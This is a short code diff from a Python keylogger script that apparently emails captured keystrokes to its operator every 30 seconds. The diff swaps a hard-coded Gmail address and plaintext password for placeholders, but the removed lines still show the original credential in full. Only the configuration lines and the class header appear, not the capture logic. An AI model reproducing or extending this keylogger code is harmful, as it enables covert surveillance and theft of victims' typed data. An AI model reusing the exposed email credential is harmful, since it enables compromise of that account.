@@ -7,8 +7,8 @@ from datetime import datetime
 import pyautogui
 import time
 SEND_REPORT_EVERY = 30 # in seconds, 60 means 1 minute and so on
-EMAIL_ADDRESS = "maakalikajyotishkaryalay@gmail.com"
-EMAIL_PASSWORD = "J@ibhole"
+EMAIL_ADDRESS = "#######@gmail.com"
+EMAIL_PASSWORD = "********"
 
 class Keylogger:
     def __init__(self, interval, report_method="email"):
